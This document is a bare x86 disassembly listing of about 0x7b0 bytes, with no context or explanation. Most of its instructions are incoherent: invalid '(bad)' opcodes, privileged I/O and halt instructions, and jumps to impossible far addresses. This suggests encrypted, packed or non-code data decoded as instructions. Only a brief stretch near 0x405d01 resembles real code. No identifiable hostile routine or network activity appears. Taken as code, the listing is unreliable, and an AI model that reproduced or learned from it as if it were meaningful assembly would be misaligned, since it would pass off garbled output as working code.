  4059ca:	mov    cl,0x9d
  4059cc:	or     al,dh
  4059ce:	push   es
  4059cf:	cmp    dh,bh
  4059d1:	push   esi
  4059d2:	pop    ds
  4059d3:	adc    eax,0xc5ebf273
  4059d8:	inc    esp
  4059d9:	cmp    eax,0x8218dad3
  4059de:	fld    QWORD PTR [eax]
  4059e0:	je     0x4059b0
  4059e2:	pusha  
  4059e3:	movntps XMMWORD PTR [edi-0x6c],xmm7
  4059e7:	sub    al,0xc5
  4059e9:	data16 sar al,0x56
  4059ed:	scas   al,BYTE PTR es:[edi]
  4059ee:	dec    ecx
  4059ef:	mov    al,ds:0xbfa66463
  4059f4:	dec    esp
  4059f5:	inc    ecx
  4059f6:	xchg   edx,eax
  4059f7:	add    DWORD PTR [esi],ecx
  4059f9:	add    BYTE PTR [edi],cl
  4059fb:	cli    
  4059fc:	dec    edi
  4059fd:	out    dx,al
  4059fe:	stos   BYTE PTR es:[edi],al
  4059ff:	dec    ecx
  405a00:	movsx  edi,BYTE PTR [eax+0x100abda0]
  405a07:	inc    esi
  405a08:	inc    eax
  405a09:	sbb    DWORD PTR [edi+0x15],ecx
  405a0c:	std    
  405a0d:	dec    edi
  405a0e:	jl     0x405a72
  405a10:	mov    edi,0xae43f203
  405a15:	test   edx,edi
  405a17:	push   ds
  405a18:	imul   ebx,DWORD PTR [edx-0x725869c9],0x5d
  405a1f:	add    ah,dh
  405a21:	aam    0x9c
  405a23:	fdiv   QWORD PTR [eax]
  405a25:	mov    BYTE PTR [ecx],0xfb
  405a28:	mov    cl,0x7b
  405a2a:	push   edx
  405a2b:	scas   eax,DWORD PTR es:[edi]
  405a2c:	xchg   edi,eax
  405a2d:	and    BYTE PTR [ecx-0x44],bh
  405a30:	aaa    
  405a31:	jns    0x4059f6
  405a33:	std    
  405a34:	rcr    eax,cl
  405a36:	in     al,dx
  405a37:	push   ax
  405a39:	jecxz  0x405a8a
  405a3b:	bound  ebx,QWORD PTR [edi-0x66cddb1b]
  405a41:	stos   BYTE PTR es:[edi],al
  405a42:	adc    al,BYTE PTR [ebp-0x44]
  405a45:	daa    
  405a46:	rol    BYTE PTR [ecx-0x53],0x59
  405a4a:	and    edx,esi
  405a4c:	aas    
  405a4d:	mov    al,ds:0x457363bc
  405a52:	jo     0x405a87
  405a54:	push   0x56e320e2
  405a59:	sti    
  405a5a:	add    eax,0xbef149f7
  405a5f:	add    BYTE PTR [ebx-0x2c],0x58
  405a63:	xchg   DWORD PTR [ecx-0x66bd934a],esp
  405a69:	stc    
  405a6a:	sbb    ch,al
  405a6c:	loop   0x405a97
  405a6e:	imul   esi,DWORD PTR [eax],0xb3b87fe3
  405a74:	ss push ecx
  405a76:	pop    esp
  405a77:	mov    dh,0xc7
  405a79:	repz pusha 
  405a7b:	dec    esi
  405a7c:	ret    
  405a7d:	add    eax,0x67cd5a6b
  405a82:	or     eax,0xd2ec51b3
  405a87:	cmp    DWORD PTR [eax],0x3ce3ab4
  405a8d:	sbb    ecx,esp
  405a8f:	mov    ds:0xf6a6dd7e,eax
  405a94:	mov    ds:0xbd399db2,eax
  405a99:	jo     0x405a59
  405a9b:	push   cs
  405a9c:	inc    BYTE PTR [edx]
  405a9e:	cmp    BYTE PTR [eax],0x94
  405aa1:	jmp    0x614a17f8
  405aa6:	(bad)  
  405aa8:	and    DWORD PTR [edi+0x2a],ebx
  405aab:	add    DWORD PTR [edi],esp
  405aad:	inc    ebx
  405aae:	pop    eax
  405aaf:	dec    esi
  405ab0:	push   eax
  405ab1:	sbb    bl,al
  405ab3:	out    0x44,al
  405ab5:	mov    ecx,0xfaa36fc6
  405aba:	sub    BYTE PTR [ebp-0x45c7a00e],0x15
  405ac1:	inc    ebx
  405ac2:	pop    esp
  405ac3:	adc    al,0x94
  405ac5:	push   0xfffffffa
  405ac7:	js     0x405af8
  405ac9:	in     eax,0x38
  405acb:	adc    eax,0xe000d32f
  405ad0:	popf   
  405ad1:	push   ss
  405ad2:	xchg   edi,eax
  405ad3:	xor    bl,BYTE PTR [ecx+0x33]
  405ad6:	adc    eax,0xcab32575
  405adb:	mov    edx,DWORD PTR [edx+edi*4]
  405ade:	and    DWORD PTR [ebx+0x989176e],0xffffffff
  405ae5:	or     BYTE PTR [ebp+0xe],dh
  405ae8:	repz add BYTE PTR [edi-0x489b1f4],dl
  405aef:	jae    0x405b03
  405af1:	cld    
  405af2:	lea    esp,[esi+0x7e]
  405af5:	ror    DWORD PTR [ecx],0x60
  405af8:	daa    
  405af9:	xor    DWORD PTR [esi+0x1e33f160],esi
  405aff:	das    
  405b00:	jge    0x405b67
  405b02:	(bad)  
  405b03:	push   ss
  405b04:	shr    BYTE PTR [ecx],1
  405b06:	mov    WORD PTR [esi],ds
  405b08:	loope  0x405b21
  405b0a:	ins    DWORD PTR es:[edi],dx
  405b0b:	xchg   esi,eax
  405b0c:	sahf   
  405b0d:	std    
  405b0e:	mov    ebx,0x60e5b7ff
  405b13:	jecxz  0x405b0d
  405b15:	xlat   BYTE PTR ds:[ebx]
  405b16:	shl    DWORD PTR es:[edi],0xc8
  405b1a:	hlt    
  405b1b:	pop    esp
  405b1c:	outs   dx,BYTE PTR ds:[esi]
  405b1d:	ss (bad) 
  405b21:	pushf  
  405b22:	sub    al,0xd9
  405b24:	(bad)  
  405b26:	test   DWORD PTR [ebx],eax
  405b28:	enter  0x11,0xf5
  405b2c:	ror    DWORD PTR [edx+ebp*2-0x67],0x20
  405b31:	popa   
  405b32:	cmp    BYTE PTR [edx-0x2ac0ce8f],cl
  405b38:	vmovsd xmm2,QWORD PTR [ebx-0x51b39fc8]
  405b40:	test   eax,0x4f4dd082
  405b45:	sbb    eax,DWORD PTR [ebx+eiz*1+0x49]
  405b49:	xor    al,dl
  405b4b:	icebp  
  405b4c:	push   esp
  405b4d:	int3   
  405b4e:	shr    ah,cl
  405b50:	mov    gs,edx
  405b52:	pop    esi
  405b53:	jge    0x405b55
  405b55:	(bad)  
  405b57:	cs data16 (bad) 
  405b5a:	ins    BYTE PTR es:[edi],dx
  405b5b:	test   DWORD PTR [esi+edi*1],esp
  405b5e:	pop    es
  405b5f:	loopne 0x405b91
  405b61:	scas   eax,DWORD PTR es:[edi]
  405b62:	out    0xd8,eax
  405b64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b65:	ror    dh,1
  405b67:	(bad)  
  405b68:	xchg   esi,eax
  405b69:	dec    esi
  405b6a:	or     ebx,DWORD PTR [eax]
  405b6c:	or     bl,0x6e
  405b6f:	and    esi,DWORD PTR [edi+0x4418f700]
  405b75:	push   ecx
  405b76:	xchg   ebx,eax
  405b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b78:	adc    ch,BYTE PTR [edi]
  405b7a:	pop    ecx
  405b7b:	xor    DWORD PTR [esi],eax
  405b7d:	pop    eax
  405b7e:	ficomp DWORD PTR [esi-0x77]
  405b81:	jae    0x405bec
  405b83:	mov    ds:0x9bae08fb,eax
  405b88:	xchg   edi,eax
  405b89:	or     ebx,edx
  405b8b:	outs   dx,DWORD PTR ds:[esi]
  405b8c:	cmc    
  405b8d:	pushf  
  405b8e:	loop   0x405bc1
  405b90:	dec    ecx
  405b91:	push   es
  405b92:	xor    al,0x5a
  405b94:	into   
  405b95:	int3   
  405b96:	push   dx
  405b98:	adc    bl,BYTE PTR [ecx]
  405b9a:	mov    ebp,0x5dc22444
  405b9f:	mov    ebx,0xe08a9bc3
  405ba4:	mov    esp,0xc9a274ce
  405ba9:	pushf  
  405baa:	mov    esi,0xe3dd10c8
  405baf:	or     BYTE PTR [esi],0xfb
  405bb2:	ret    
  405bb3:	dec    esi
  405bb4:	xor    BYTE PTR [ebx],0x8f
  405bb7:	shr    BYTE PTR [esp+ecx*2-0x72],1
  405bbb:	push   ds
  405bbc:	sbb    al,0x63
  405bbe:	push   es
  405bbf:	inc    eax
  405bc0:	inc    esp
  405bc1:	(bad)  
  405bc2:	cwde   
  405bc3:	es xchg esp,eax
  405bc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bc6:	jp     0x405c3a
  405bc8:	lods   eax,DWORD PTR ds:[esi]
  405bc9:	jmp    0x405c08
  405bcb:	adc    eax,0x10a5aa0a
  405bd0:	xchg   ecx,eax
  405bd1:	call   0x6bf3:0xe69821fe
  405bd8:	aad    0xe0
  405bda:	ins    DWORD PTR es:[edi],dx
  405bdb:	dec    ebx
  405bdc:	mov    edx,0x9b673839
  405be1:	cmp    DWORD PTR [edi+0x7d],eax
  405be4:	pop    ds
  405be5:	popf   
  405be6:	std    
  405be7:	add    al,0x4c
  405be9:	add    BYTE PTR [ebx],al
  405beb:	mov    ebx,0xbea674fa
  405bf0:	cmp    eax,0x87450951
  405bf5:	pop    ss
  405bf6:	push   eax
  405bf7:	add    DWORD PTR [ebp+0x2796b38d],edi
  405bfd:	xor    esi,DWORD PTR [ebp+0x510cda0e]
  405c03:	adc    bh,BYTE PTR [esi+0x5f6ee181]
  405c09:	sahf   
  405c0a:	or     esp,DWORD PTR [eax]
  405c0c:	int3   
  405c0d:	aaa    
  405c0e:	aad    0x49
  405c10:	mov    ds:0x8fdafe0c,eax
  405c15:	sub    eax,0x2306b5f6
  405c1a:	cld    
  405c1b:	pop    edx
  405c1c:	in     eax,0xb6
  405c1e:	push   esi
  405c1f:	add    DWORD PTR [ebx+0x22],edx
  405c22:	pop    eax
  405c23:	or     eax,0x9a3aaa86
  405c28:	sti    
  405c29:	dec    DWORD PTR ds:[eax+0x2b23ffd2]
  405c30:	stos   BYTE PTR es:[edi],al
  405c31:	cmp    cl,BYTE PTR [eax]
  405c33:	out    dx,al
  405c34:	dec    edx
  405c35:	leave  
  405c36:	std    
  405c37:	(bad)  
  405c38:	fadd   st(7),st
  405c3a:	jl     0x405c80
  405c3c:	xchg   edx,eax
  405c3d:	push   eax
  405c3e:	xchg   esi,eax
  405c3f:	std    
  405c40:	inc    edi
  405c41:	xlat   BYTE PTR ds:[ebx]
  405c42:	or     eax,0xfd7e22d9
  405c47:	cdq    
  405c48:	das    
  405c49:	and    al,0x3f
  405c4b:	dec    esi
  405c4c:	jmp    0x951bbbb1
  405c51:	mov    ds:0x743959ac,al
  405c56:	sub    edx,0xffffffb5
  405c59:	sbb    DWORD PTR [esi-0x4f21360c],0x7d
  405c60:	loop   0x405c6a
  405c62:	stos   BYTE PTR es:[edi],al
  405c63:	cmovle eax,DWORD PTR [ebx]
  405c66:	jns    0x405c3f
  405c68:	or     edi,esp
  405c6a:	cmp    eax,0xed83cfe1
  405c6f:	das    
  405c70:	imul   ebx,DWORD PTR [edi+0x62],0xfffffff8
  405c74:	shl    ah,cl
  405c76:	sbb    ch,ah
  405c78:	mov    ebp,0x3d314c7a
  405c7d:	test   al,0xcc
  405c7f:	xor    bh,ch
  405c81:	cs ja  0x405cea
  405c84:	(bad)  
  405c86:	push   0xffffffd3
  405c88:	mov    edi,0xa213074d
  405c8d:	or     eax,0x5934c1e4
  405c92:	push   edx
  405c93:	ss push esi
  405c95:	call   0xaa447ca6
  405c9a:	shl    DWORD PTR [esi],1
  405c9c:	xor    DWORD PTR [esi],esi
  405c9e:	(bad)  
  405c9f:	sub    esi,DWORD PTR [eax-0x50c5a339]
  405ca5:	mov    dl,0xd3
  405ca7:	push   ebx
  405ca8:	jmp    0x2b0b:0x1dcef146
  405caf:	sub    DWORD PTR [ecx+0x5d],0x1bcec3d3
  405cb6:	inc    ebp
  405cb7:	repz jmp 0x405cdc
  405cba:	rcr    bh,0xe3
  405cbd:	adc    DWORD PTR [edx-0x4fc67e9e],0x9c825353
  405cc7:	idiv   BYTE PTR [ebx+ebx*1+0x2aca45e6]
  405cce:	out    0x2a,eax
  405cd0:	mov    WORD PTR [edi],fs
  405cd2:	adc    edi,DWORD PTR [ecx]
  405cd4:	(bad)  
  405cd6:	ins    DWORD PTR es:[edi],dx
  405cd7:	stc    
  405cd8:	xchg   edi,eax
  405cd9:	mov    DWORD PTR [ecx+0xa46cff7],edx
  405cdf:	ja     0x405c69
  405ce1:	out    dx,al
  405ce2:	in     eax,dx
  405ce3:	test   DWORD PTR [edx-0x51a5cdef],ebx
  405ce9:	mov    edi,0xf93431c5
  405cee:	sbb    DWORD PTR [edi],edi
  405cf0:	loope  0x405d06
  405cf2:	fdiv   DWORD PTR [ebx]
  405cf4:	mov    dh,0x7f
  405cf6:	mov    ah,dl
  405cf8:	fimul  DWORD PTR [ebx-0x241633ab]
  405cfe:	push   es
  405cff:	add    BYTE PTR [eax],al
  405d01:	mov    edx,DWORD PTR [ebp-0x3c]
  405d04:	mov    edi,DWORD PTR [ebp-0x4]
  405d07:	xor    edx,eax
  405d09:	xor    edi,eax
  405d0b:	add    edx,ecx
  405d0d:	add    edi,ecx
  405d0f:	imul   edx,edi
  405d12:	mov    edi,DWORD PTR [ebp-0x8]
  405d15:	mov    ebx,DWORD PTR [ebp-0x10]
  405d18:	sub    ebx,edi
  405d1a:	jmp    0x406074
  405d1f:	jmp    0xd15f6e3f
  405d24:	xor    eax,0xe321e9f1
  405d29:	les    ecx,FWORD PTR [edi]
  405d2b:	inc    ecx
  405d2c:	aaa    
  405d2d:	xchg   esi,eax
  405d2e:	add    al,0x2f
  405d30:	ds jle 0x405db1
  405d33:	xor    edi,DWORD PTR [ebp+0x7e]
  405d36:	jle    0x405cf8
  405d38:	push   ebp
  405d39:	cmp    DWORD PTR [edi+0x48],esi
  405d3c:	inc    ebp
  405d3d:	cmp    BYTE PTR [esi-0x77],ah
  405d40:	dec    eax
  405d41:	cs push 0xfa4d4908
  405d47:	sbb    DWORD PTR [ecx-0xf3eb89b],0xffffffd6
  405d4e:	pop    edi
  405d4f:	adc    DWORD PTR [edx-0x6d],ebp
  405d52:	pop    ecx
  405d53:	and    esp,ecx
  405d55:	jle    0x405d8b
  405d57:	fisub  WORD PTR [ebp-0x58469340]
  405d5d:	sub    dh,cl
  405d5f:	cli    
  405d60:	mov    ah,0xa8
  405d62:	xchg   BYTE PTR [esp+eiz*8-0x2795b0cf],ch
  405d69:	popf   
  405d6a:	das    
  405d6b:	mov    cl,0x61
  405d6d:	and    BYTE PTR [ebp+0x3d],0x2f
  405d71:	int    0x26
  405d73:	lea    ecx,[esi]
  405d75:	add    BYTE PTR [edi-0x3a],dh
  405d78:	push   DWORD PTR [edx-0x62]
  405d7b:	jnp    0x405d68
  405d7d:	jbe    0x405d4b
  405d7f:	lock data16 jge 0x405d9b
  405d83:	ds addr16 sti 
  405d86:	out    dx,eax
  405d87:	lea    esp,[edi+ebp*2+0x39]
  405d8b:	fwait
  405d8c:	dec    ecx
  405d8d:	hlt    
  405d8e:	shr    edx,1
  405d90:	inc    ebx
  405d91:	out    dx,eax
  405d92:	les    edi,FWORD PTR [eax]
  405d94:	push   esp
  405d95:	mov    eax,ds:0x55ad27c3
  405d9a:	(bad)  
  405d9b:	int    0xb3
  405d9d:	out    dx,al
  405d9e:	xchg   esp,eax
  405d9f:	pop    edx
  405da0:	scas   al,BYTE PTR es:[edi]
  405da1:	push   ebx
  405da2:	imul   edi,DWORD PTR [edx+ebx*2],0x56
  405da6:	xor    esi,0xfb9e2cba
  405dac:	hlt    
  405dad:	jae    0x405df8
  405daf:	icebp  
  405db0:	enter  0xceac,0xed
  405db4:	hlt    
  405db5:	lods   al,BYTE PTR ds:[esi]
  405db6:	leave  
  405db7:	dec    DWORD PTR [esi+0x4a]
  405dba:	xor    dl,BYTE PTR [edi-0x50]
  405dbd:	push   ecx
  405dbe:	dec    ebp
  405dbf:	shr    DWORD PTR [esp+ebp*4-0x66],1
  405dc3:	pop    esp
  405dc4:	dec    edx
  405dc5:	and    ebp,DWORD PTR ds:0x962c9fed
  405dcb:	xchg   ebp,eax
  405dcc:	cli    
  405dcd:	pop    esp
  405dce:	enter  0xa015,0x75
  405dd2:	div    DWORD PTR [ecx-0x67]
  405dd5:	inc    esp
  405dd6:	jge    0x405d5c
  405dd8:	xlat   BYTE PTR ds:[ebx]
  405dd9:	or     eax,0x41a949d2
  405dde:	xchg   edx,eax
  405ddf:	lock popa 
  405de1:	imul   ebp,DWORD PTR [ebx+0x63c5b0cd],0x695c3f67
  405deb:	(bad)  
  405dec:	sti    
  405ded:	jo     0x405e2a
  405def:	push   cs
  405df0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405df1:	sub    eax,0xb547dc14
  405df6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405df7:	adc    eax,DWORD PTR [edi]
  405df9:	bound  esi,QWORD PTR ds:0x706b78aa
  405dff:	leave  
  405e00:	inc    edx
  405e01:	push   cs
  405e02:	sti    
  405e03:	fadd   QWORD PTR [ebx+0x4a]
  405e06:	ss and eax,0xc308d52b
  405e0c:	dec    edi
  405e0d:	test   BYTE PTR [edx-0x51],ah
  405e10:	jnp    0x405e42
  405e12:	xchg   ebx,eax
  405e13:	jg     0x405e91
  405e15:	lahf   
  405e16:	in     al,0x39
  405e18:	data16 jg 0x405e94
  405e1b:	dec    eax
  405e1c:	in     al,0xe2
  405e1e:	mov    ebx,0xd6200b4e
  405e23:	mov    ebx,0x33439081
  405e28:	lea    esp,[edx]
  405e2a:	cmp    al,BYTE PTR [esi-0x65]
  405e2d:	mov    esp,0x61fd59bf
  405e32:	aaa    
  405e33:	call   0x90f4aaa2
  405e38:	test   DWORD PTR [eax],ecx
  405e3a:	mov    al,ds:0x1fd2a0bf
  405e3f:	ins    DWORD PTR es:[edi],dx
  405e40:	inc    ebx
  405e41:	jge    0x405e23
  405e43:	sbb    al,0xc7
  405e45:	add    al,BYTE PTR [esi-0x59]
  405e48:	sub    ecx,DWORD PTR [eax]
  405e4a:	xchg   edi,edx
  405e4c:	jg     0x405e66
  405e4e:	pop    ebx
  405e4f:	in     al,0xa8
  405e51:	or     dl,bh
  405e53:	out    0x80,eax
  405e55:	fadd   QWORD PTR [ebp+0x5e63c8ff]
  405e5b:	mov    bl,0x72
  405e5d:	inc    esi
  405e5e:	mov    ds:0x87d0e97b,eax
  405e63:	mov    edx,0x989fca0f
  405e68:	jmp    0x73f02ab0
  405e6d:	sub    al,0x1b
  405e6f:	jg     0x405e12
  405e71:	cs mov bl,0xce
  405e74:	rol    DWORD PTR [ecx],1
  405e76:	mov    esi,0xe6a77ad
  405e7b:	sub    dh,bh
  405e7d:	inc    edx
  405e7e:	cli    
  405e7f:	cmovne esi,DWORD PTR [edx-0x68c81a12]
  405e86:	scas   al,BYTE PTR es:[edi]
  405e87:	aas    
  405e88:	rcr    DWORD PTR [eax+0x106c7617],0x4
  405e8f:	loope  0x405ea6
  405e91:	fmul   QWORD PTR [eax+0x5d]
  405e94:	mov    cs,WORD PTR [esi]
  405e96:	cmc    
  405e97:	inc    ebp
  405e98:	(bad)  
  405e99:	adc    eax,0x3f03d525
  405e9e:	sub    esp,DWORD PTR [ebp-0x7f]
  405ea1:	(bad)  
  405ea2:	xchg   si,ax
  405ea4:	dec    edx
  405ea5:	sbb    BYTE PTR [eax+0x43],dl
  405ea8:	rcr    BYTE PTR [ecx+0x50],1
  405eab:	mov    esi,DWORD PTR [esi]
  405ead:	fwait
  405eae:	adc    DWORD PTR [ebx-0x7a17807e],ecx
  405eb4:	xchg   ecx,eax
  405eb5:	ds js  0x405efd
  405eb8:	scas   eax,DWORD PTR es:[edi]
  405eb9:	add    eax,0x4086f431
  405ebe:	sbb    DWORD PTR [eax+esi*1],esi
  405ec1:	(bad)  
  405ec3:	daa    
  405ec4:	in     al,dx
  405ec5:	bound  esp,QWORD PTR [edi+0x26]
  405ec8:	xchg   ebp,eax
  405ec9:	mov    dh,0x75
  405ecb:	jno    0x405f39
  405ecd:	xor    DWORD PTR [eax-0x59],ebx
  405ed0:	in     al,dx
  405ed1:	adc    eax,0x42b8651f
  405ed6:	sbb    esp,edi
  405ed8:	icebp  
  405ed9:	adc    eax,eax
  405edb:	and    BYTE PTR [edx+edx*1-0x78],0x84
  405ee0:	popa   
  405ee1:	cwde   
  405ee2:	scas   eax,DWORD PTR es:[edi]
  405ee3:	lods   eax,DWORD PTR ds:[esi]
  405ee4:	add    DWORD PTR [edx-0x3a14d794],edx
  405eea:	lahf   
  405eeb:	sub    edx,DWORD PTR [esi-0x14b6fde1]
  405ef1:	aaa    
  405ef2:	std    
  405ef3:	push   es
  405ef4:	add    al,0x51
  405ef6:	dec    ebx
  405ef7:	jne    0x405f3a
  405ef9:	(bad)  
  405efa:	mov    ah,0x69
  405efc:	sbb    ah,BYTE PTR [eax+0x58]
  405eff:	(bad)  
  405f00:	int3   
  405f01:	loopne 0x405e91
  405f03:	(bad)  
  405f04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f05:	mov    al,0x9
  405f07:	sti    
  405f08:	sub    cl,BYTE PTR [ebx+0x5f8accca]
  405f0e:	rcr    BYTE PTR [edx-0x79280279],0x2d
  405f15:	dec    ebx
  405f16:	xchg   ax,ax
  405f18:	shr    DWORD PTR [ebp+0x3a],0x6f
  405f1c:	sahf   
  405f1d:	test   BYTE PTR [esi+0x704add21],dh
  405f23:	mov    eax,ds:0xe3577516
  405f28:	hlt    
  405f29:	adc    dl,BYTE PTR [ebx+0x4e]
  405f2c:	(bad)  
  405f2d:	and    edi,DWORD PTR [esi+0xb002812]
  405f33:	xor    al,0xfc
  405f35:	jnp    0x405ebc
  405f37:	fnsave [eax-0x7d0e960b]
  405f3d:	ins    BYTE PTR es:[edi],dx
  405f3e:	scas   eax,DWORD PTR es:[edi]
  405f3f:	cdq    
  405f40:	je     0x405f72
  405f42:	cmp    eax,0x1c45982e
  405f47:	or     BYTE PTR [ebx],dl
  405f49:	or     al,0xb0
  405f4b:	out    dx,eax
  405f4c:	mov    ds:0xfa367943,eax
  405f51:	jg     0x405f38
  405f53:	sahf   
  405f54:	leave  
  405f55:	iret   
  405f56:	add    DWORD PTR [esi-0x80],esp
  405f59:	mov    ebx,0xe8f9fc1d
  405f5e:	xor    eax,DWORD PTR ds:0x77f9d0c0
  405f64:	jnp    0x405f97
  405f66:	cmp    eax,0xa2d6cf2f
  405f6b:	in     eax,dx
  405f6c:	test   BYTE PTR [ebx],bl
  405f6e:	add    al,0x1d
  405f70:	retf   0xb14d
  405f73:	or     DWORD PTR [ebx+ebp*1],ebx
  405f76:	mov    edx,0xc94913c4
  405f7b:	mov    eax,0x678a9147
  405f80:	out    dx,eax
  405f81:	retf   
  405f82:	sub    al,0x87
  405f84:	cmp    DWORD PTR [ecx-0x58e864c2],edi
  405f8a:	adc    BYTE PTR ds:0x148ac312,0xa3
  405f91:	repz hlt 
  405f93:	test   eax,0x723b7bce
  405f98:	pushf  
  405f99:	or     ecx,DWORD PTR [edx-0x536071a2]
  405f9f:	push   ebx
  405fa0:	xchg   BYTE PTR [ebx+esi*4-0x3f19609],cl
  405fa7:	pusha  
  405fa8:	aam    0xf4
  405faa:	fidiv  DWORD PTR [edi+ebx*8-0x5]
  405fae:	icebp  
  405faf:	or     al,0xc9
  405fb2:	or     dl,0xd9
  405fb5:	or     al,0xc4
  405fb7:	data16 je 0x405ff8
  405fba:	shr    DWORD PTR [eax-0x60],1
  405fbd:	data16 mov bl,0x9
  405fc0:	sbb    BYTE PTR [edi+0x59],bl
  405fc3:	inc    ecx
  405fc4:	(bad)  
  405fc5:	jp     0x405f79
  405fc7:	scas   eax,DWORD PTR es:[edi]
  405fc8:	inc    esp
  405fc9:	in     eax,0x34
  405fcb:	jo     0x405f90
  405fcd:	fsubr  DWORD PTR [edi+0x3a6f2961]
  405fd3:	icebp  
  405fd4:	adc    eax,0xc8778b84
  405fd9:	popf   
  405fda:	inc    eax
  405fdb:	ja     0x405fd8
  405fdd:	pusha  
  405fde:	loope  0x405fa6
  405fe0:	adc    eax,edi
  405fe2:	cmp    ecx,DWORD PTR [ebx-0x2f]
  405fe5:	adc    eax,0x48917a59
  405fea:	cdq    
  405feb:	sbb    al,0x5b
  405fed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fee:	xchg   ebx,eax
  405fef:	retf   
  405ff0:	sub    DWORD PTR ds:0xd4992dcd,ebp
  405ff6:	or     eax,0xd0853aca
  405ffb:	push   esp
  405ffc:	jmp    0xc0c0:0xd1cc0b8e
  406003:	sti    
  406004:	xchg   BYTE PTR [edi+0x79],bl
  406007:	fs push esi
  406009:	mov    bh,0xe0
  40600b:	push   0xffffffe5
  40600d:	xor    esp,edi
  40600f:	mov    BYTE PTR [ebx],bl
  406011:	mov    esi,0x414b2c55
  406016:	pop    ebx
  406017:	jbe    0x405fb0
  406019:	cwde   
  40601a:	sbb    ecx,DWORD PTR [ebx]
  40601c:	xor    BYTE PTR [eax-0x2b5e1c8e],cl
  406022:	nop
  406023:	inc    edx
  406024:	inc    ebp
  406025:	ja     0x406028
  406027:	sub    edi,DWORD PTR gs:[ecx]
  40602a:	loop   0x406000
  40602c:	lock push 0xf8f1efbc
  406032:	pusha  
  406033:	hlt    
  406034:	imul   eax,ecx,0xddf626fd
  40603a:	aaa    
  40603b:	addr16 cdq 
  40603d:	cmp    eax,0x9ed57535
  406042:	loop   0x406088
  406044:	(bad)  
  406045:	jg     0x406095
  406047:	sbb    bh,dh
  406049:	add    bh,BYTE PTR [eax+eax*1+0x15]
  40604d:	sbb    ecx,0xd3b8d8dc
  406053:	pop    ebp
  406054:	cmp    bl,BYTE PTR [ebp+0x0]
  406057:	test   al,0x21
  406059:	pushf  
  40605a:	mov    edi,0x23a24597
  40605f:	scas   al,BYTE PTR es:[edi]
  406060:	ficom  WORD PTR [esi+ebx*8+0x8]
  406064:	cdq    
  406065:	test   edx,edx
  406067:	xchg   BYTE PTR [edx+0x3d6f2cbc],ah
  40606d:	mov    eax,0x7e28dabb
  406072:	mov    ebp,fs
  406074:	cmp    ebx,edx
  406076:	mov    edx,DWORD PTR [ebp-0x38]
  406079:	jmp    0x4063d3
  40607e:	test   eax,0x68f06eef
  406083:	jno    0x406036
  406085:	ja     0x406061
  406087:	shr    BYTE PTR [edx+0x79],0x75
  40608b:	popa   
  40608c:	dec    edx
  40608d:	ins    BYTE PTR es:[edi],dx
  40608e:	loopne 0x4060cd
  406090:	jle    0x406110
  406092:	xor    edi,DWORD PTR [ebp+0x7e]
  406095:	jle    0x4060db
  406097:	(bad)
  40609c:	fdiv   DWORD PTR [edi]
  40609e:	mov    ebp,0x3e6cbb63
  4060a3:	sub    esp,eax
  4060a5:	(bad)  
  4060a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060a7:	inc    esp
  4060a8:	aaa    
  4060a9:	adc    BYTE PTR [edx],bl
  4060ab:	test   al,0xa
  4060ad:	(bad)  
  4060ae:	and    DWORD PTR [edi+0x36],0x9470b16e
  4060b5:	hlt    
  4060b6:	out    0x2d,al
  4060b8:	pop    es
  4060b9:	jmp    0x9805513d
  4060be:	inc    eax
  4060bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060c0:	sbb    bl,bh
  4060c2:	mov    dl,0x8e
  4060c4:	ret    0x90ba
  4060c7:	aas    
  4060c8:	fist   DWORD PTR [ebx+0x3c2be9f5]
  4060ce:	add    DWORD PTR [esp+eax*8-0x2],ecx
  4060d2:	or     bh,ch
  4060d4:	imul   esi,DWORD PTR [esi],0xffffff81
  4060d7:	xor    al,0x51
  4060d9:	add    DWORD PTR [edx],ebp
  4060db:	retf   0xe500
  4060de:	movq   mm7,QWORD PTR [ebx]
  4060e1:	xchg   esp,eax
  4060e2:	cmp    ecx,eax
  4060e4:	cmp    eax,0xb8d8d2f
  4060e9:	push   ds
  4060ea:	rol    BYTE PTR [edi+eax*8+0x4d],cl
  4060ee:	lods   eax,DWORD PTR ds:[esi]
  4060ef:	pop    ss
  4060f0:	(bad)  
  4060f1:	adc    ah,ch
  4060f3:	and    al,0xc
  4060f5:	sbb    BYTE PTR [esi-0x44],bh
  4060f8:	fcomip st,st(7)
  4060fa:	sbb    edi,edi
  4060fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060fd:	sub    bh,BYTE PTR [esp+ecx*8-0x3b5c6c92]
  406104:	pop    eax
  406105:	stos   DWORD PTR es:[edi],eax
  406106:	mov    bl,0xde
  406108:	ins    DWORD PTR es:[edi],dx
  406109:	repnz shl DWORD PTR [ebx*2-0x5449719a],0x58
  406112:	sbb    DWORD PTR es:[ecx-0x1d],eax
  406116:	ret    0x79da
  406119:	or     BYTE PTR [edx+0x5c701ffb],ch
  40611f:	and    edi,0xffffff88
  406122:	xor    eax,0x645b5911
  406127:	mov    esp,ebx
  406129:	mov    eax,0x76438d10
  40612e:	push   ds
  40612f:	ret    
  406130:	cmp    BYTE PTR [edx],bl
  406132:	xchg   esi,eax
  406133:	cs and al,0xbc
  406136:	push   ebp
  406137:	rcl    DWORD PTR cs:[eax+eiz*2],1
  40613b:	mov    dh,dl
  40613d:	ret    
  40613e:	jle    0x406134
  406140:	loopne 0x406139
  406142:	(bad)  
  406143:	jb     0x40619a
  406145:	or     bh,BYTE PTR [edi+0x67e3e63b]
  40614b:	or     al,0x7d
  40614d:	inc    DWORD PTR [ecx]
  40614f:	sub    DWORD PTR [ebp-0x1c],esi
  406152:	xchg   edi,eax
  406153:	push   ebx
  406154:	push   es
  406155:	inc    esp
  406156:	xchg   edx,eax
  406157:	mov    ebp,0x77f18226
  40615c:	mov    ch,0xc0
  40615e:	jmp    0xa56e:0x18b017d2
  406165:	add    dh,BYTE PTR [ecx]
  406167:	or     eax,0xf8f6aff4
  40616c:	nop
  40616d:	minps  xmm7,xmm2
  406170:	arpl   WORD PTR [edx],sp
  406172:	add    eax,0xde2837ff
  406177:	push   edx
  406178:	mov    edx,0xfcd76dfa
  40617e:	jae    0x406100
